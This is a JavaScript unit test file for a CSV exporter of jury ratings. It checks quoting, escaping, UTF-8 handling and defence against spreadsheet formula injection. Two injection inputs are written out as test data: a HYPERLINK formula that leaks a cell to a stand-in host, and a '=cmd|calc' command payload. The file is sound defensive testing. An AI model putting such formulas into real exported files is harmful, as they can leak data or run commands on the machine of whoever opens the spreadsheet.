import {buildRatingsCsv} from '../juryResultsCsv'

const headers = [
  'Team',
  'Jury',
  'Criterion',
  'Score',
  'Criterion points',
  'Normalized (/5)',
  'Comment',
]

function csv(ratings, options = {}) {
  return buildRatingsCsv({ratings, headers, ...options})
}

describe('buildRatingsCsv', () => {
  it('resolves team, jury and criterion ids to names', () => {
    const output = csv(
      [['9', [{juror: '5', criterion: 'c1', score: 8, criterion_points: 10, normalized_score: 4}]]],
      {names: {9: 'Team Aurora', 5: 'Jury 01'}, criterionNames: {c1: 'Technical execution'}},
    )

    expect(output.split('\r\n')[1]).toBe(
      '"Team Aurora","Jury 01","Technical execution","8","10","4",""',
    )
  })

  it('falls back to raw ids when a name is missing', () => {
    const output = csv([['9', [{juror: '5', criterion: 'c1'}]]])

    expect(output.split('\r\n')[1]).toBe('"9","5","c1","","","",""')
  })

  it('keeps a multiline comment inside a single quoted field', () => {
    const comments = 'First line\nSecond line\n\nFourth line'
    const output = csv([['9', [{juror: '5', criterion: 'c1', score: 8, comments}]]])

    expect(output).toContain(`"${comments}"`)
    // The record spans the embedded newlines, so splitting on them must not yield bare rows.
    expect(output.split('\r\n')).toHaveLength(2)
  })

  it('escapes embedded quotes by doubling them', () => {
    const output = csv([
      ['9', [{juror: '5', criterion: 'c1', comments: 'They said "great work" twice'}]],
    ])

    expect(output).toContain('"They said ""great work"" twice"')
  })

  it('quotes commas and carriage returns rather than emitting them bare', () => {
    const output = csv([['9', [{juror: '5', criterion: 'c1', comments: 'a, b\r\nc'}]]])

    expect(output).toContain('"a, b\r\nc"')
  })

  it('neutralises comments a spreadsheet would evaluate as a formula', () => {
    const output = csv([
      [
        '9',
        [{juror: '5', criterion: 'c1', comments: '=HYPERLINK("http://evil.test?"&A1,"clickme")'}],
      ],
    ])

    expect(output).toContain('"\'=HYPERLINK(""http://evil.test?""&A1,""clickme"")"')
  })

  it('neutralises every formula lead character, including in names', () => {
    const leads = ['=cmd|calc', '+1+1', '-1+1', '@SUM(A1)', '\tinjected', '\rinjected']

    leads.forEach(lead => {
      const output = csv([['9', [{juror: '5', criterion: 'c1', comments: lead}]]], {
        names: {9: lead},
      })

      expect(output).toContain(`"'${lead}"`)
    })
  })

  it('leaves numeric scores unprefixed so they stay numbers', () => {
    const output = csv([
      ['9', [{juror: '5', criterion: 'c1', score: -2, criterion_points: 10, normalized_score: 0}]],
    ])

    expect(output).toContain('"-2","10","0"')
  })

  it('starts with a BOM so Excel reads it as UTF-8', () => {
    const output = csv([['9', [{juror: '5', criterion: 'c1'}]]], {
      names: {9: 'Pep Canyelles Pericàs'},
    })

    expect(output.startsWith('\uFEFF')).toBe(true)
    expect(output).toContain('Pep Canyelles Pericàs')
  })

  it('emits only headers when there are no ratings', () => {
    expect(csv([])).toBe(`\uFEFF"${headers.join('","')}"`)
  })
})
